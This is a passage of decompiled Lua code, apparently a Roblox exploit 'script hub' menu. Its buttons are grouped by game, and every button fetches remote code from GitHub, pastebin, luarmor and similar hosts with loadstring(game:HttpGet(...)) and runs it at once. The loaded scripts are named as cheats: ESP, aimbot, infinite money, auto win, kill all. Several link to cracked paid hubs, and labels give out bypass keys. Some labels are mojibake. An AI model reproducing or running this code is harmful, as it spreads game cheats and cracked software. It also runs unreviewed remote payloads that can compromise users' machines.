          loadstring(game:HttpGet("https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua"))()
        end,
      })
      r42_4:AddButton({
        Name = "Nova Boat",
        Callback = function()
          -- line: [0, 0] id: 139
          loadstring(game:HttpGet("https://raw.githubusercontent.com/novakoolhub/Scripts/main/Scripts/NovBoatR1"))()
        end,
      })
      r42_4:AddLabel("Key For Nova Boat: N-314159")
      r42_4:AddButton({
        Name = "Ather Hub",
        Callback = function()
          -- line: [0, 0] id: 428
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua"))()
        end,
      })
      r42_4:AddButton({
        Name = "Ren Hub",
        Callback = function()
          -- line: [0, 0] id: 297
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/renhub"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Build A Bridge Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Tupo Scripts",
        Callback = function()
          -- line: [0, 0] id: 370
          loadstring(game:HttpGet("https://pastebin.com/raw/EwhdfyNQ"))()
        end,
      })
      local r44_4 = r4_4:MakeTab({
        Name = "Boxing Beta",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r44_4:AddButton({
        Name = "Infinite Yield",
        Callback = function()
          -- line: [0, 0] id: 594
          loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end,
      })
      r44_4:AddButton({
        Name = "Auto Clicker",
        Callback = function()
          -- line: [0, 0] id: 191
          loadstring(game:HttpGetAsync("https://pastebin.com/raw/WgkcDYUs"))()
        end,
      })
      local r45_4 = r4_4:MakeTab({
        Name = "Boxing League",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r45_4:AddButton({
        Name = "Walkspeed Changer",
        Callback = function()
          -- line: [0, 0] id: 330
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SethProYT/boxing-league-script/main/script"))()
        end,
      })
      r45_4:AddButton({
        Name = "Auto Clicker",
        Callback = function()
          -- line: [0, 0] id: 513
          loadstring(game:HttpGetAsync("https://pastebin.com/raw/WgkcDYUs"))()
        end,
      })
      local r46_4 = r4_4:MakeTab({
        Name = "Breaking Point",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r46_4:AddButton({
        Name = "Devil\'s Hub",
        Callback = function()
          -- line: [0, 0] id: 218
          loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/devil-sbeakingpointgui/main/main"))()
        end,
      })
      r46_4:AddButton({
        Name = "Breaking Plus",
        Callback = function()
          -- line: [0, 0] id: 158
          loadstring(game:HttpGet("https://raw.githubusercontent.com/NaikoScript/Breaking-Plus/main/Script"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Bitcoin Miner",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Xhan-Ware",
        Callback = function()
          -- line: [0, 0] id: 134
          loadstring(game:HttpGet("https://raw.githubusercontent.com/blxtok/Xhan-Ware/main/loader.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Be A Pickaxe",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Bacon Hacks",
        Callback = function()
          -- line: [0, 0] id: 533
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/refs/heads/main/BeAPickaxe"))()
        end,
      })
      local r49_4 = r4_4:MakeTab({
        Name = "Bad Business",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r49_4:AddButton({
        Name = "ESP",
        Callback = function()
          -- line: [0, 0] id: 551
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderScriptSolutions/Misc/main/BadBusinessESP"))()
        end,
      })
      r49_4:AddButton({
        Name = "Homohack",
        Callback = function()
          -- line: [0, 0] id: 421
          loadstring(game:HttpGet("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Big Paintball 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Sky Hub",
        Callback = function()
          -- line: [0, 0] id: 557
          loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Broken Bones IV",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Inf Money",
        Callback = function()
          -- line: [0, 0] id: 160
          loadstring(game:HttpGet("https://rawscripts.net/raw/Broken-Bones-IV-Ragdoll-Sim-Infinite-money-19709"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Break 1 Car Every Click",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Break 1 Car Every Click Script",
        Callback = function()
          -- line: [0, 0] id: 123
          loadstring(game:HttpGet("https://pastebin.com/raw/XzG2ZRm2"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Catalog Avatar Creator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Catalog Avatar Creator Hub",
        Callback = function()
          -- line: [0, 0] id: 22
          loadstring(game:HttpGet("https://pastebin.com/raw/V3VT1pNd", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Car Dealership Tycoon",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Ultimate Hub",
        Callback = function()
          -- line: [0, 0] id: 124
          loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/UltimateHub"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Car Crushers 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Kitty Hub",
        Callback = function()
          -- line: [0, 0] id: 126
          loadstring(game:HttpGet("https://whimper.xyz/kitty"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Cheese Escape",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Pepper.lol",
        Callback = function()
          -- line: [0, 0] id: 602
          loadstring(game:HttpGet("https://pastebin.com/raw/yqc0mVEb"))()
        end,
      })
      local r57_4 = r4_4:MakeTab({
        Name = "Combat Warriors",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r57_4:AddButton({
        Name = "Lumin Hub",
        Callback = function()
          -- line: [0, 0] id: 643
          loadstring(game:HttpGet("https://lumin-hub.lol/cw.lua", true))()
        end,
      })
      r57_4:AddButton({
        Name = "Bird Hub",
        Callback = function()
          -- line: [0, 0] id: 539
          loadstring(game:HttpGet("https://pastebin.com/raw/pexrijZn"))()
        end,
      })
      r57_4:AddButton({
        Name = "Combat Warriors Script",
        Callback = function()
          -- line: [0, 0] id: 152
          loadstring(game:HttpGet("https://raw.githubusercontent.com/IsaaaKK/cwhb/main/cw.txt"))()
        end,
      })
      local r58_4 = r4_4:MakeTab({
        Name = "Counter Blox",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r58_4:AddButton({
        Name = "Jaran.vip",
        Callback = function()
          -- line: [0, 0] id: 388
          loadstring(game:HttpGet("https://raw.githubusercontent.com/fliskScript/jaran.vip/main/free.lua"))()
        end,
      })
      r58_4:AddButton({
        Name = "Solaris.lol",
        Callback = function()
          -- line: [0, 0] id: 760
          loadstring(game:HttpGet("https://raw.githubusercontent.com/toasty-dev/pissblox/main/solaris_bootstrapper.lua", true))()
        end,
      })
      r58_4:AddLabel("ï¿½ ÑÐ¾Ð»Ð°ÑÐ¸ÑÐµ Ð½Ðµ ÑÐ·Ð°Ð¹ÑÐµ Kill All Ð¸Ð½Ð°ÑÐµ Ð²Ð°Ñ Ð·Ð°Ð±Ð°Ð½ÑÑ")
      r58_4:AddLabel("In Solaris, do not use Kill All, otherwise you will be banned")
      local r59_4 = r4_4:MakeTab({
        Name = "Criminality",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r59_4:AddButton({
        Name = "Femboy Ware",
        Callback = function()
          -- line: [0, 0] id: 548
          writefile("Rayfield/Key System/Key123.rfld", "NoHomo")
          loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/FemboysHubBoosr/2784d6c4ede4340ad9af4865828d915ffc26c7bb/Criminality"))()
        end,
      })
      r59_4:AddButton({
        Name = "Femboys Hub Premium Crack",
        Callback = function()
          -- line: [0, 0] id: 206
          loadstring(game:HttpGet("https://you.whimper.xyz/FemboysCrimHub"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Cart Ride Fun",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Auto Win",
        Callback = function()
          -- line: [0, 0] id: 178
          loadstring(game:HttpGet("https://pastebin.com/raw/RSTXfwWG"))()
        end,
      })
      local r61_4 = r4_4:MakeTab({
        Name = "Character RNG",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r61_4:AddButton({
        Name = "Ghoul Hub",
        Callback = function()
          -- line: [0, 0] id: 145
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Glibson1/-Ghoul/main/Ghoul"))()
        end,
      })
      r61_4:AddLabel("Key: /Ghoul")
      r4_4:MakeTab({
        Name = "Classic Sonic Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Classic Sonic Simulator Script",
        Callback = function()
          -- line: [0, 0] id: 705
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Kirill31312/CSS-Script-V0.3-R/main/CSS%20Script%20R%20V0.3"))()
        end,
      })
      local r63_4 = r4_4:MakeTab({
        Name = "Criminal Tycoon",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r63_4:AddButton({
        Name = "Auto Collect Cash",
        Callback = function()
          -- line: [0, 0] id: 687
          loadstring(game:HttpGet("https://pastebin.com/raw/yNPVDssJ"))()
        end,
      })
      r63_4:AddButton({
        Name = "Mikey Hub",
        Callback = function()
          -- line: [0, 0] id: 130
          loadstring(game:HttpGet("https://you.whimper.xyz/mikey"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Color Block",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Auto TP To Block, etc.",
        Callback = function()
          -- line: [0, 0] id: 559
          loadstring(game:HttpGet("https://gist.githubusercontent.com/Slyrith/6ae0fa2c9d98521a61fb87ffb4613b3d/raw/9517024aaf91046233138801a476e93996bb4202/ColorBlock.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Casual Stock",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Casual Stock Script",
        Callback = function()
          -- line: [0, 0] id: 490
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Dorisuss/DorisusFreeMob/main/FreeMobOBF4784.lua"))()
        end,
      })
      local r66_4 = r4_4:MakeTab({
        Name = "Chaos",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r66_4:AddButton({
        Name = "Happy Hub",
        Callback = function()
          -- line: [0, 0] id: 738
          loadstring(game:HttpGet("https://raw.githubusercontent.com/uedan228/Happy-Hub/main/CHAOS", true))()
        end,
      })
      r66_4:AddButton({
        Name = "420script",
        Callback = function()
          -- line: [0, 0] id: 180
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bluntman420n/fucns/main/FUCKYOUCUNT.BLUNT", true))()
        end,
      })
      local r67_4 = r4_4:MakeTab({
        Name = "Dead Rails",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r67_4:AddButton({
        Name = "KiciaHook",
        Callback = function()
          -- line: [0, 0] id: 614
          loadstring(game:HttpGet("https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.lua"))()
        end,
      })
      r67_4:AddButton({
        Name = "NullFire Hub",
        Callback = function()
          -- line: [0, 0] id: 770
          loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
        end,
      })
      r67_4:AddButton({
        Name = "Nat Hub (Auto Bonds And More)",
        Callback = function()
          -- line: [0, 0] id: 170
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua"))()
        end,
      })
      r67_4:AddButton({
        Name = "Native Hub",
        Callback = function()
          -- line: [0, 0] id: 759
          script_key = "PASTEKEYHERE"
          (loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()
        end,
      })
      r67_4:AddButton({
        Name = "Speed Hub X",
        Callback = function()
          -- line: [0, 0] id: 70
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
        end,
      })
      r67_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 569
          loadstring(game:HttpGet(request({
            Url = "https://aussie.productions/script",
          }).Body))()
        end,
      })
      r67_4:AddButton({
        Name = "SpineWare",
        Callback = function()
          -- line: [0, 0] id: 455
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineWare/UniversalLoader/refs/heads/main/Load"))()
        end,
      })
      r67_4:AddButton({
        Name = "CyberSeall Hub",
        Callback = function()
          -- line: [0, 0] id: 659
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/aca362a74eb2f7c5f383969177c26b6b.lua"))()
        end,
      })
      r67_4:AddButton({
        Name = "Tbao Hub",
        Callback = function()
          -- line: [0, 0] id: 305
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
        end,
      })
      r67_4:AddButton({
        Name = "Ren Hub",
        Callback = function()
          -- line: [0, 0] id: 95
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Reyn7525/RenHub/refs/heads/main/Loader"))()
        end,
      })
      r67_4:AddButton({
        Name = "AirFlow Hub",
        Callback = function()
          -- line: [0, 0] id: 447
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
        end,
      })
      r67_4:AddButton({
        Name = "NPC Aimbot",
        Callback = function()
          -- line: [0, 0] id: 663
          loadstring(game:HttpGet("https://pastebin.com/raw/FX4qw9Aj"))()
        end,
      })
      local r68_4 = r4_4:MakeTab({
        Name = "Doors",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r68_4:AddButton({
        Name = "FFJ Hub",
        Callback = function()
          -- line: [0, 0] id: 210
          loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
        end,
      })
      r68_4:AddButton({
        Name = "mspaint v2 (best script)",
        Callback = function()
          -- line: [0, 0] id: 63
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/002c19202c9946e6047b0c6e0ad51f84.lua"))()
        end,
      })
      r68_4:AddButton({
        Name = "Black King Hub",
        Callback = function()
          -- line: [0, 0] id: 162
          loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
        end,
      })
      r68_4:AddButton({
        Name = "Ren Hub",
        Callback = function()
          -- line: [0, 0] id: 716
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/renhub"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Da Hood",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "TBO",
        Callback = function()
          -- line: [0, 0] id: 155
          loadstring(game:HttpGet("https://raw.githubusercontent.com/cool5013/TBO/main/TBOscript"))()
        end,
      })
      local r70_4 = r4_4:MakeTab({
        Name = "Demonfall",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r70_4:AddButton({
        Name = "NS Hub",
        Callback = function()
          -- line: [0, 0] id: 427
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/DF2/main/Solara"))()
        end,
      })
      r70_4:AddButton({
        Name = "Alter Hub",
        Callback = function()
          -- line: [0, 0] id: 32
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/alterhub"))()
        end,
      })
      r70_4:AddLabel("ï¿½ÑÐ»Ð¸ ÑÑÐµÐ±ÑÐµÑ Ð²Ð²ÐµÑÑÐ¸ ÐºÐ»ÑÑ Ð² Alter Hub Ð²Ð¾Ñ Ð¾Ð½: 25ms")
      r70_4:AddLabel("If it requires you to enter a key in Alter Hub, here it is: 25ms")
      r70_4:AddButton({
        Name = "Nuke Hub - Ghost GUI",
        Callback = function()
          -- line: [0, 0] id: 639
          loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader"))()
        end,
      })
      r70_4:AddLabel("ï¿½Ð¾Ð³Ð´Ð° Ð·Ð°Ð¿ÑÑÑÐ¸ÑÑÑ ÑÐºÑÐ¸Ð¿Ñ Nuke Hub Ð²ÑÐ±ÐµÑÐ¸ÑÐµ Ghost GUI")
      r70_4:AddLabel("When the script Nuke Hub starts, select Ghost GUI")
      local r71_4 = r4_4:MakeTab({
        Name = "Dandy\'s World",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r71_4:AddButton({
        Name = "Dandy\'s World Hub (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 541
          loadstring(game:HttpGet("https://pastebin.com/raw/FBRnb7S7"))()
        end,
      })
      r71_4:AddButton({
        Name = "Iriska Hub",
        Callback = function()
          -- line: [0, 0] id: 494
          loadstring(game:HttpGet("https://pastebin.com/raw/N4Y01FkS"))()
        end,
      })
      r71_4:AddButton({
        Name = "Spooky Hub",
        Callback = function()
          -- line: [0, 0] id: 532
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ApparentlySpooks/dandysworldspookshub/refs/heads/main/obfuscated%20spooks%20hub%20dandys%20world.lua"))()
        end,
      })
      r71_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 708
          loadstring(game:HttpGet(request({
            Url = "https://aussie.productions/script",
          }).Body))()
        end,
      })
      r71_4:AddButton({
        Name = "FFJ Hub",
        Callback = function()
          -- line: [0, 0] id: 267
          loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
        end,
      })
      local r72_4 = r4_4:MakeTab({
        Name = "Driving Empire",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r72_4:AddButton({
        Name = "Kitty Hub",
        Callback = function()
          -- line: [0, 0] id: 239
          loadstring(game:HttpGet("https://whimper.xyz/kitty"))()
        end,
      })
      r72_4:AddButton({
        Name = "Max Hub",
        Callback = function()
          -- line: [0, 0] id: 398
          loadstring(game:HttpGet("https://pastebin.com/raw/p1U9qvQw"))()
        end,
      })
      r72_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 205
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      local r73_4 = r4_4:MakeTab({
        Name = "Dungeon Quest",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r73_4:AddButton({
        Name = "NS Hub",
        Callback = function()
          -- line: [0, 0] id: 240
          getgenv().UseKey = "25ms"
          getgenv().KeyMode = nil
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/DQ/main/Solara"))()
        end,
      })
      r73_4:AddLabel("ï¿½ÑÐ»Ð¸ Ð² NS Hub Ð¿Ð¾Ð¿ÑÐ¾ÑÐ¸Ñ ÐºÐ»ÑÑ Ð²Ð¾Ñ Ð¾Ð½: 25ms")
      r73_4:AddLabel("If NS Hub asks for a key, here it is: 25ms")
      r4_4:MakeTab({
        Name = "Dress To Impress",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Troll GUI",
        Callback = function()
          -- line: [0, 0] id: 756
          loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/DTI-GUI-V2/main/dti_gui_v2.lua", true))()
        end,
      })
      local r75_4 = r4_4:MakeTab({
        Name = "Devas Of Creations",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r75_4:AddButton({
        Name = "Alter Hub",
        Callback = function()
          -- line: [0, 0] id: 98
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/alterhub"))()
        end,
      })
      r75_4:AddLabel("ï¿½ÑÐ»Ð¸ ÑÑÐµÐ±ÑÐµÑ Ð²Ð²ÐµÑÑÐ¸ ÐºÐ»ÑÑ Ð² Alter Hub Ð²Ð¾Ñ Ð¾Ð½: 25ms")
      r75_4:AddLabel("If it requires you to enter a key in Alter Hub, here it is: 25ms")
      r4_4:MakeTab({
        Name = "Duck Army",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Ywxo Hub",
        Callback = function()
          -- line: [0, 0] id: 271
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ywxoofc/specifier/refs/heads/main/4826912925.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Dragon Ball RNG",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "JJP GUI",
        Callback = function()
          -- line: [0, 0] id: 657
          loadstring(game:HttpGet("https://raw.githubusercontent.com/jjp2iky/scripts/main/DBR"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Decaying Winter",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Scav Hub",
        Callback = function()
          -- line: [0, 0] id: 321
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/scav"))()
        end,
      })
      local r79_4 = r4_4:MakeTab({
        Name = "Dingus",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r79_4:AddButton({
        Name = "Ren Hub",
        Callback = function()
          -- line: [0, 0] id: 135
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/renhub"))()
        end,
      })
      r79_4:AddButton({
        Name = "SyniX Hub",
        Callback = function()
          -- line: [0, 0] id: 308
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RayzMd/SyniX-Team/main/SyniXScripts"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Domino Playground",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Inf Cash",
        Callback = function()
          -- line: [0, 0] id: 752
          loadstring(game:HttpGet("https://pastebin.com/raw/C9tsKaML"))()
        end,
      })
      local r81_4 = r4_4:MakeTab({
        Name = "Emergency Hamburg",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r81_4:AddButton({
        Name = "AirFlow",
        Callback = function()
          -- line: [0, 0] id: 741
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
        end,
      })
      r81_4:AddButton({
        Name = "Good Script",
        Callback = function()
          -- line: [0, 0] id: 109
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Emergency%20Hamburg"))()
        end,
      })
      r81_4:AddButton({
        Name = "Vortex Hub",
        Callback = function()
          -- line: [0, 0] id: 254
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ItemTo/VortexV2/refs/heads/main/EH"))()
        end,
      })
      r81_4:AddButton({
        Name = "Simple Script",
        Callback = function()
          -- line: [0, 0] id: 227
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
        end,
      })
      local r82_4 = r4_4:MakeTab({
        Name = "Eat The World",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r82_4:AddButton({
        Name = "World Hub (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 713
          getgenv().KeyMode = 2
          getgenv().AllowAnyKey = true
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/KeyGuardianBeta"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/NhatMinhVNQ/w-hub/main/WORLDHUB.lua"))()
        end,
      })
      r82_4:AddButton({
        Name = "Seder Hub",
        Callback = function()
          -- line: [0, 0] id: 481
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Mongusohio/EatTheWorldMadeBySederYTTV/main/Heresomerizzgrimacr"))()
        end,
      })
      r82_4:AddButton({
        Name = "Stockings Hub",
        Callback = function()
          -- line: [0, 0] id: 755
          loadstring(game:HttpGet("https://raw.githubusercontent.com/stockingsloverr/roblox-scripts/refs/heads/main/EatTheWorld"))()
        end,
      })
      r82_4:AddButton({
        Name = "Rinns Hub",
        Callback = function()
          -- line: [0, 0] id: 675
          loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
        end,
      })
      local r83_4 = r4_4:MakeTab({
        Name = "Epic Minigames",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r83_4:AddButton({
        Name = "Epic Minigames GUI",
        Callback = function()
          -- line: [0, 0] id: 128
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Epic%20Minigames/EpicMinigamesGUI"))()
        end,
      })
      r83_4:AddButton({
        Name = "Another GUI",
        Callback = function()
          -- line: [0, 0] id: 89
          loadstring(game:HttpGet("https://pastebin.com/raw/YePwz5u5", true))()
        end,
      })
      local r84_4 = r4_4:MakeTab({
        Name = "Evade",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r84_4:AddButton({
        Name = "Aurora",
        Callback = function()
          -- line: [0, 0] id: 514
          loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/Aurora/main/Aurora_Loader"))()
        end,
      })
      r84_4:AddButton({
        Name = "King Hub",
        Callback = function()
          -- line: [0, 0] id: 707
          pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/zReal-King/Evade/main/Main.lua")))
        end,
      })
      r84_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 671
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r84_4:AddButton({
        Name = "Tbao Hub",
        Callback = function()
          -- line: [0, 0] id: 417
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEvade"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Elemental Powers Tycoon",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Over Hub",
        Callback = function()
          -- line: [0, 0] id: 281
          loadstring(game:HttpGet("https://you.whimper.xyz/overhub.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Easy Obby",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Complete Obby In 5 Seconds",
        Callback = function()
          -- line: [0, 0] id: 104
          loadstring(game:HttpGet("https://pastebin.com/raw/sciPkGdH"))()
        end,
      })
      local r87_4 = r4_4:MakeTab({
        Name = "Fisch",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r87_4:AddButton({
        Name = "Bonk Hub (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 35
          loadstring(game:HttpGet("https://you.whimper.xyz/platoboost"))()
          loadstring(game:HttpGet("https://bonkhubloader.netlify.app", true))()
        end,
      })
      r87_4:AddButton({
        Name = "Zenith Hub",
        Callback = function()
          -- line: [0, 0] id: 709
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
        end,
      })
      r87_4:AddButton({
        Name = "Speed Hub X",
        Callback = function()
          -- line: [0, 0] id: 501
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
        end,
      })
      r87_4:AddButton({
        Name = "Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 463
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/Fisch.lua"))()
        end,
      })
      r87_4:AddButton({
        Name = "Vixie Hub",
        Callback = function()
          -- line: [0, 0] id: 100
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjektEta/Vixie.lua/refs/heads/main/Loader.lua"))()
        end,
      })
      r87_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 269
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r87_4:AddButton({
        Name = "Express Hub",
        Callback = function()
          -- line: [0, 0] id: 229
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r87_4:AddButton({
        Name = "Native Hub (website to get the script)",
        Callback = function()
          -- line: [0, 0] id: 721
          setclipboard("https://getnative.cc/")
        end,
      })
      local r88_4 = r4_4:MakeTab({
        Name = "Flee The Facility",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r88_4:AddButton({
        Name = "YARHM Hub",
        Callback = function()
          -- line: [0, 0] id: 679
